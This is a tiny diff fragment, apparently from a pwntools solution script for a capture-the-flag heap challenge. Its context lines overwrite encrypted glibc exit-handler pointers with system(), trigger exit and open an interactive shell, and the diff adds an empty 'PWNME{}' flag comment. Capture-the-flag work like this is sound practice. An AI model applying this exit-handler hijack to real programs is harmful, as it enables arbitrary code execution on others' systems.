@@ -169,3 +169,5 @@ edit_note(p64(exit_funcs_encrypt(glibc_base_addr+glibc_e.symbols.system, key))+p
 exit_note()
 
 p.interactive()
+
+# PWNME{}
